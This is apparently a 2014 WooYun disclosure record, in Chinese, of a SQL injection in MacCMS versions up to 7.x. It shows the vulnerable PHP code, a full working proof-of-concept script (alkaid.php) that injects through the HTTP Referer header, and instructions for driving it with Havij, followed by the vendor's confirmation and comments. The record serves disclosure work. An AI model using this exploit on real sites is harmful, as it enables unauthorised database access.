{"id": 4886, "wybug_id": "wooyun-2014-048553", "wybug_title": "MacCMS 全版本通杀SQL注射（包括最新7.x）", "wybug_corp": "maccms.com", "wybug_author": "lxj616", "wybug_date": "2014-01-13 12:17", "wybug_open_date": "2014-04-13 12:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-13：\t细节向公众公开  简要描述： 之前我发了个6.x的注射，没人认领，因此这次想找cncert了本次针对官网最新7.7版本的maccms测试，和之前的6.x注射有一些差异（重构了代码，而且用了360给的防护脚本）结合之前无人认领的旧版注射，可以达到全版本注射危害不言而喻了吧 详细说明：  /user/index.php line:615\nfunction tg()   //推广功能，吐槽一下之前6.x版本用的英文popularize，这就变拼音了{\tglobal $db;\t$userid = be(\"get\",\"uid\"); $userid=chkSql($userid,true); //完全不可控\t\tif (!chkGlobalCache(\"tjlastdate\")){\tsetGlobalCache (\"tjlastdate\", date('Y-m-d'),0); }\tif (isNum($userid)){\t\t$ip = getIP();        //我本以为用到了360的过滤脚本\t\t$ly=  getReferer();   //我本以为用到了360的过滤脚本，见后面跟踪\t\t$row = $db->getRow(\"select * from {pre}user where u_id=\" . $userid .\"\"); \t\tif ($row){  //这里不要误会，不是需要你登陆后注射，而是你填一个合法的“推广者”id即可，填1绝对可行，除非整个网站没有会员\t\t\t$sql=\"Select * From {pre}user_visit where uv_uid = \" .$userid.\" and uv_ip ='\".$ip.\"' and STR_TO_DATE(uv_time,'%Y-%m-%d')='\".date(\"Y-m-d\").\"'\";   //不在这里exploit，控制referer容易点\t\t\t\t\t\t$row1 = $db->getRow($sql);\t\t\tif (!$row1){\t\t\t\t$db->Add (\"{pre}user_visit\",array(\"uv_uid\",\"uv_ip\",\"uv_ly\",\"uv_time\"), array($userid,$ip,$ly, date(\"Y-m-d H:i:s\")));//ly变量进入了查询，小心后面还有个date，之后构造的时候不能忘记//和以下代码无关\t\t\t\t$db->query (\"update {pre}user set u_tj=u_tj+1,u_points=u_points+\" . app_popularize . \" where u_id=\". $userid);\t\t\t\tif ( strpos( \",\". date('Y-m-d H:i:s',time()), getGlobalCache(\"tjlastdate\") ) <=0 ) {\t\t\t\t\t $sql=\"delete from {pre}user_visit whereSTR_TO_DATE(uv_time,'%Y-%m-%d')<'\".date(\"Y-m-d\").\"'\";\t\t\t\t\t $db->query($sql);\t\t\t\t\t setGlobalCache (\"tjlastdate\", date('Y-m-d') , 0);\t\t\t\t}\t\t\t}\t\t\tunset($row1);\t\t}\t\tunset($row);\t}\tredirect (\"../\");}\n对比，和6.x的差异在于代码重构了，360也给了一个过滤的脚本，但是……/inc/function.php   line:248\nfunction getReferer(){\treturn $_SERVER[\"HTTP_REFERER\"];}\n360的过滤脚本哭了，根本就没出场的镜头……好吧，原理分析完了，证明危害继续给出poc由于在referer里面，又需要构造一下后面的date，于是自己写php中转请求原理是转发请求，同时方便地提供$_GET[\"a\"]用来把注射语句合进referer至于date 我直接就构造 now 了，见下文代码alkaid.php\n<?phpfunction uc_fopen($url, $limit = 0, $post = '', $cookie = '', $bysocket = FALSE, $ip = '', $timeout = 15, $block = TRUE,$inject) {$return = '';$matches = parse_url($url);!isset($matches['host']) && $matches['host'] = '';!isset($matches['path']) && $matches['path'] = '';!isset($matches['query']) && $matches['query'] = '';!isset($matches['port']) && $matches['port'] = '';$host = $matches['host'];$path = $matches['path'] ? $matches['path'].($matches['query'] ? '?'.$matches['query'] : '') : '/';$port = !empty($matches['port']) ? $matches['port'] : 80;if($post) {   $out = \"POST $path HTTP/1.0\\r\\n\";   $out .= \"Accept: **\\r\\n\";   //$out .= \"Referer: $boardurl\\r\\n\";   $out .= \"Accept-Language: zh-cn\\r\\n\";   $out .= \"User-Agent: $_SERVER[HTTP_USER_AGENT]\\r\\n\";   $out .= \"Host: $host\\r\\n\";   $out .= \"Connection: Close\\r\\n\";   $out .= \"Cookie: $cookie\\r\\n\\r\\n\";}else {   $out = \"GET $path HTTP/1.0\\r\\n\";   $out .= \"Accept: */*\\r\\n\";   $out .= \"Referer: a',(select now()) and \".$inject.\")#\\r\\n\";   $out .= \"Accept-Language: zh-cn\\r\\n\";   $out .= \"User-Agent: $_SERVER[HTTP_USER_AGENT]\\r\\n\";   $out .= \"Host: $host\\r\\n\";   $out .= \"Connection: Close\\r\\n\";   $out .= \"Cookie: $cookie\\r\\n\\r\\n\";}$fp = @fsockopen(($ip ? $ip : $host), $port, $errno, $errstr, $timeout);if(!$fp) {   return '';//note $errstr : $errno \\r\\n} else {   stream_set_blocking($fp, $block);   stream_set_timeout($fp, $timeout);   @fwrite($fp, $out);   $status = stream_get_meta_data($fp);   if(!$status['timed_out']) {    while (!feof($fp)) {     if(($header = @fgets($fp)) && ($header == \"\\r\\n\" || $header == \"\\n\")) {      break;     }    }    $stop = false;    while(!feof($fp) && !$stop) {     $data = fread($fp, ($limit == 0 || $limit > 8192 ? 8192 : $limit));     $return .= $data;     if($limit) {      $limit -= strlen($data);      $stop = $limit <= 0;     }    }   }   @fclose($fp);   return $return;}}uc_fopen('http://127.0.0.1/user/?action=tg&uid=1',0,0,0,FALSE,'',15,true,$_GET[\"a\"]);echo 'hi';?>\n用Havij扫描\nhttp://127.0.0.1/alkaid.php?a=1%3d1\n就会把构造好的referer发送到http://127.0.0.1/user/?action=tg&uid=1上用法：1.把alkaid.php本地搭建起来2.修改alkaid.php倒数几行，把http://127.0.0.1/user/?action=tg&uid=1改成对应的测试地址，uid填一个存在的用户即可，自己本身无需登录3.havij 直射本地alkaid.php http://127.0.0.1/alkaid.php?a=1%3d1\n\n   漏洞证明：  \n\n   修复方案：  用360的过滤脚本啊~直接就\treturn $_SERVER[\"HTTP_REFERER\"];这让360情何以堪   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-01-13 19:15 厂商回复： 漏洞已经确认，现已更新最新版本程序包，加入了360防护脚本。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-13 20:49 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  看来社区人期望的出来了    \n     2014-02-04 08:10 |    \t\tetcat \t\t\t( 普通白帽子  |\t\t\t        Rank:149 漏洞数:22        | 0101010101001010101010101010100101010101...)\t\t \n  牛逼 这个吊咋天了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}